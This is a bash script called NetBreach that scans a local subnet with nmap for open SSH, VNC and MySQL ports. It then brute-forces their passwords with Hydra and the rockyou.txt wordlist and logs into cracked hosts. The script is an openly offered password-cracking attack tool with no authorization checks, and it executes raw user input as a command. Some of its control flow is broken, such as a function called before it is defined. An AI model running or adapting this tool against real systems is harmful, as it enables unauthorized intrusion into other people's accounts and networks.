#!/bin/bash

# File that holds all the variables needed for the program to work properly
source DontEdit.sh

# Function to handle cleanup on exit
EXIT_PROGRAM_WITH_CTRL_C() {
    echo -e "${RED}[-]${NC} EXITING SOFTWARE..."
    # Add cleanup commands here
    exit 1
}

EXIT_PROGRAM_WITH_CTRL_Z(){
    echo ""
    echo -e "${RED}[-]${NC} EXITING SOFTWARE..."
    # Add cleanup commands here
    exit 1
}

# Function to be executed when Ctrl+Z is pressed
handle_ctrl_z() {
    EXIT_PROGRAM_WITH_CTRL_Z
}

# Set up the trap to call the function on SIGTSTP (Ctrl+Z)
trap 'handle_ctrl_z' SIGTSTP

# Function to handle Ctrl+C
ctrl_c() {
    echo ""
    EXIT_PROGRAM_WITH_CTRL_C
}

trap ctrl_c SIGINT

# Function to check if a command exists
command_exists() {
    command -v "$1" >/dev/null 2>&1
}

# If the user uses the skip function, it skips the install process of the packages
if [ "$1" = "--skip" ]; then
    RunHackingCommandWithVNC
# Otherwise, it installs the packages
else
    # Check for required packages
    for package in "${required_packages[@]}"; do
        if ! command_exists "$package"; then
            echo ""
            echo -e "[ ${RED}FAIL${NC} ] The required package ${GREEN}'${package}'${NC} is not installed. Please install it and try again."
            sleep 1 

            # Asks the user if they want to install the missing packages
            echo "Would you like me to install it for you? YES/NO"

            read -p ">>> " install
            if [[ " ${yes[*]} " == *" ${install} "* ]]; then
                bash requirements.sh
                exit 1
            else
                echo "Ok, stopping program"
                exit 1
            fi
        fi
    done
fi

# Check if the script is run with --help or -h
if [ "$1" = "--help" ] || [ "$1" = "-h" ]; then
    figlet "? HELP ?"
    echo
    echo "+++++++++++++++Programs used+++++++++++++++"
    echo "This program will help you crack passwords"
    echo "It has two programs inside it, one is Hydra and the other is Nmap"
    echo
    echo "+++++++++++++++How to use++++++++++++++++++"
    echo "To use the program you have to tell the computer what port you want to scan."
    echo "It will then scan the port that you asked for on the network and see if any ports that you asked are open."
    echo "If there are any ports that are open, it will ask for a username and hostname."
    echo "When you give the program the username and hostname, it will try to crack the given parameters you gave it."
    echo
else
    # Check if root user
    if [[ $EUID -ne 0 ]]; then
        echo -e "[ ${RED}FAIL${NC} ]: Please run as root."
        exit 1
    fi

    if [[ "$OSTYPE" == "${OS}"* ]]; then
        clear
        if [[ $EUID -ne 0 ]]; then
            # Error message if not running as root
            echo "ERROR:TIME:${CURRENT_TIME} Please run as root. DATE:${CURRENT_DATE}" >> ERROR.LOG
            echo -e "[ ${RED}FAIL${NC} ]: TIME:${CURRENT_TIME} Please run as ROOT. DATE:${CURRENT_DATE}"
            exit 1
        else
            sudo rm -rf hydra.restore
            clear

            # Check if the user is connected to the internet
            SITE="https://google.com/"
            if ! curl --head --silent --fail $SITE > /dev/null; then
                echo "ERROR:TIME:${CURRENT_TIME} Please connect to the internet. DATE:${CURRENT_DATE}" >> ERROR.LOG
                echo -e "[ ${RED}${BRIGHT}FAIL${NC} ] TIME:${CURRENT_TIME} Please connect to the internet. DATE:${CURRENT_DATE}"
                exit 1
            fi

            clear

            # Function to start NetBreach
            NetBreach() {
                figlet -f slant "NetBreach"
                echo "Type the number of the port you want to scan (SSH - 22, VNC - 5900, MySQL - 3306). To scan all, type 'ALL'"
                echo "If you want to stop the program, type 'stop'."
                read -p ">>> " service
                
                if [[ "${service}" == "ALL" || "${service}" == "all" || "${service}" == "*" ]]; then
                    echo -e "${RED}This can take up to 1 hour to complete.${NC}"
                    sudo nmap -sS 192.168.1.1/24 -Pn -oN scan.txt --open

                    read -p "Would you like to see the scan in an open file (Yes or No): " SeeFile
                    if [[ " ${yes[*]} " == *" ${SeeFile} "* ]]; then
                        echo "Opening the scan file"
                        sleep 1
                        open scan.txt
                    else
                        echo -e "[ ${RED}FAIL${NC} ] Ok, I will not open the scan.txt file"
                        sleep 1
                    fi
                    
                    hydra -h
                    echo "Put in Hydra first to start the script."
                    read -p ">>> " Hydra

                    if [[ " ${exit[*]} " == *" ${Hydra} "* ]]; then
                        echo "Goodbye"
                        exit 1
                    else
                        $Hydra
                        exit 1
                    fi
                elif [[ " ${exit[*]} " == *" ${service} "* ]]; then
                    echo "Stopping program..."
                    sleep 1
                    exit 1
                elif [[ -z "${service}" ]]; then
                    echo -e "${RED}ERROR:${NC} Please input a number into the input field"
                    sleep 1
                    exit 1                
                else
                    for letter in "${alphabet[@]}"; do
                        if [[ "${letter}" == "${service}" ]]; then
                            echo "Please enter a number next time"
                            exit 1
                        fi
                    done
                    sudo nmap -sS 192.168.1.1/24 -p $service -oN $service.log --open
                    read -p "Would you like to see the ${service} in an open file (Yes or No): " SeeFile
                    if [[ " ${yes[*]} " == *" ${SeeFile} "* ]]; then
                        open "${service}.log"
                    else
                        echo "[-] Ok, I will not open the ${service}.log file"
                        sleep 1
                    fi
                fi
            }

            RunHackingCommand() {
                echo
                echo "To crack VNC (5900), don't type anything in the 'Input Username' prompt"
                echo "To crack MySQL (3306), type 'localhost' in the 'Input Hostname' prompt"
                read -p "Input Username: " user
                read -p "Input Hostname: " host
                read -p "Input Port: " port
            }

            RunHackingCommandWithVNC() {
                if [[ $service == 5900 || $service == "VNC" ]]; then
                    if [[ -z $user && -z $host ]]; then
                        echo "No service specified"
                        NetBreach
                    else
                        hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://$host:$port
                        title="Connecting to ${host}"
                        echo "${title}"
                        echo "We are connecting you to '${host}'. Please wait..."
                        sleep 5
                        title="Enter password to ${host}"
                        echo "${title}"
                        echo "We have connected you to '${host}'. Please enter the password to '${host}'."
                        read -p "Input username: " username
                        read -p -s "Input password: " password
                        echo
                        echo "Loading xfreerdp server..."
                        xfreerdp /u:"${username}" /v:"${host}" /p:"${password}"
                        exit 1
                    fi
                fi
            }

            RunHackingCommandWithSSH() {
                if [[ $service == 22 || $service == "ssh" ]]; then
                    if [[ -z $user || -z $host ]]; then
                        echo "No service specified"
                        NetBreach
                    else
                        hydra -l "${user}" -P rockyou.txt -t 64 -vV -o output.log -I ssh://$host:$port
                        title="Connecting to ${user}"
                        echo "${title}"
                        echo "We are connecting you to ${user}. Please wait..."
                        sleep 5
                        title="Enter password to ${user}"
                        echo "${title}"
                        echo "We have connected you to ${user}. Please enter the password to ${user} to continue..."
                        ssh "${user}@${host}" -p "${port}"
                        exit 1
                    fi
                fi
            }

            RunHackingCommandWithMySQL() {
                if [[ $service == 3306 || $service == "mysql" ]]; then
                    if [[ -z $user || -z $host ]]; then
                        echo "No service specified"
                        NetBreach
                    else
                        hydra -l "${user}" -P rockyou.txt -t 64 -vV -o output.log -I mysql://$host:$port
                        echo "Loading MySQL server..."
                        sleep 3
                        mysql -u "${user}" -p -A
                        exit 1
                    fi
                fi
            }

            NetBreach
            RunHackingCommand
            RunHackingCommandWithVNC
            RunHackingCommandWithSSH
            RunHackingCommandWithMySQL
        fi
    else
        clear
        echo "WARNING:TIME:$CURRENT_TIME Wrong OS. Please use the correct OS. DATE:$CURRENT_DATE" >> ERROR.LOG
        echo -e "[ ${RED}${BRIGHT}FAIL${NC} ] TIME:$CURRENT_TIME Wrong OS. Please use the correct OS. DATE:$CURRENT_DATE"
    fi
fi
